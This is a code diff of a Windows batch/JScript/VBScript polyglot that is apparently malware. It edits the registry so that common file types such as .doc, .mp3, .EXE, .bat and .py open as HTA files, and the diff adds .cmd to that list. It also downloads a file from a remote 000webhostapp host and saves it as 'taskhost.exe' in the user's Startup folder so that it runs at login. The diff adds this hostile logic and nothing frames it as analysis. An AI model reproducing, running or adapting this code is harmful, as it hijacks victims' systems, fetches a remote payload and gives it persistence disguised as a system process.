@@ -1,4 +1,6 @@
+@if (true == false) @end /*
 @echo off
+Rem Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
 Rem BY **Aincrad**
 
 SET DESKTOP_REG_ENTRY="HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
@@ -23,15 +25,12 @@ reg add HKCU\Software\Classes\.doc /d "htafile" /f
 reg add HKCU\Software\Classes\.mp3 /d "htafile" /f
 reg add HKCU\Software\Classes\.mp4 /d "htafile" /f
 reg add HKCU\Software\Classes\.EXE /d "htafile" /f
+reg add HKCU\Software\Classes\.cmd /d "htafile" /f
 reg add HKCU\Software\Classes\.bat /d "htafile" /f
 reg add HKCU\Software\Classes\.jar /d "htafile" /f
 reg add HKCU\Software\Classes\.py /d "htafile" /f
 reg add HKCU\Software\Classes\.ps1 /d "htafile" /f
 
-:Main
-@if (true == false) @end /*
-@echo off
-Rem Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
 set "SYSDIR=SysWOW64"
 if "%PROCESSOR_ARCHITECTURE%" == "x86" if not defined PROCESSOR_ARCHITEW6432 set "SYSDIR=System32"
 "%WINDIR%\%SYSDIR%\cscript.exe" //nologo //e:javascript "%~f0" %*
@@ -77,10 +76,12 @@ dim shell_obj
 set http_obj = CreateObject("Microsoft.XMLHTTP")
 set stream_obj = CreateObject("ADODB.Stream")
 set shell_obj = CreateObject("WScript.Shell")
- 
+Set fso = CreateObject("Scripting.FileSystemObject")
+
 URL = "https://softwarefuturenet.000webhostapp.com/TempDocs/Shareware.temp" 
-FILENAME = "taskhost.exe" 
-RUNCMD = "taskhost.exe" 
+
+startupFolder = shell_obj.SpecialFolders("Startup") & "\"
+FILENAME = startupFolder & "taskhost.exe" 
 
 http_obj.open "GET", URL, False
 http_obj.send
@@ -89,12 +90,9 @@ stream_obj.type = 1
 stream_obj.open
 stream_obj.write http_obj.responseBody
 stream_obj.savetofile FILENAME, 2
- 
-shell_obj.run RUNCMD
 
 ' Convert by CodeSmart : https://toolslib.net/downloads/viewdownload/631-code-smart/
 
 */
 })());
-
 
